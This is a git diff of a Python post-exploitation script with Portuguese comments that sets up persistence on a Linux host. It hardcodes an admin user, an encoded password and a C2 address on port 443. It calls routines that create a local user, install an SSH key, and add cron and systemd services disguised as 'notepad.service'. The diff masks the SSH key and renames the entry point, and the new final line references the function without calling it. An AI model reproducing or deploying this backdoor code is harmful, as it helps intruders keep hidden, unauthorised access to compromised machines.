@@ -6,7 +6,7 @@ import subprocess
 # Definição das variáveis
 user = "admin"
 passwd = "LW5zZW5oYUAxMjMK"
-ssh_key_pub = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkDXQCGgEYRaXxE3heFsJCw3FkvHo7u9gtSmH6h2OV9n1a2WmQCHn0gS/TVCd4kGQPa1vjI29FqQbWmfsgsCXP9zw3z1Lvsv8X+1HvzX75vDxyPUokcrm4z4cbw20yTmomPjedblu2XLgd94a4AOKLBoTpWXUkTGR8h+PBoky9LqUPMULP+9gJfJJqQ5OWWGyONTjW4mGpu1bv9P9+nbPuhqmXHG0IISoRzbj1AyGuS02gCnTf1y7cwjBmFhIfsdRHtlHEQ1HqqAflk/gTfp9SNx+upfSzq9gzVcj+hOd/V9ihUSkHW0aiJ+uMcCXroIs+adZ122jfdugTv+TNXt8f/YqQQiYzenhrUz6ppI9dYWWSdRlYT0Oaldr1XBmConsk00lfyNPD0QeND4LVq+MjtfLNHvOVvWFnGKLLzKpoe73fYpWYPHYzgF40PTSIL1OAlHKe7DIWMfJ5CbdZsu3Xj0RFz/3lGJzf5fwvoft/Ab64GH2HpYGa+INUhnMjy0M= carlos@NTB-Lenovo'
+ssh_key_pub = 'ssh-rsa XXXXXXXXXXXXXXXXXXX'
 c2_ip = "192.168.15.126"
 c2_port = "443"
 
@@ -67,12 +67,11 @@ WantedBy=multi-user.target
     os.system("sudo systemctl status notepad.service")
 
 # Função principal
-def main():
+def get_persistence():
     create_local_user()
     persistent_user()
     ssh_key()
     cron_create_service()
     systemd_create_service()
 
-if __name__ == "__main__":
-    main()
+get_persistence
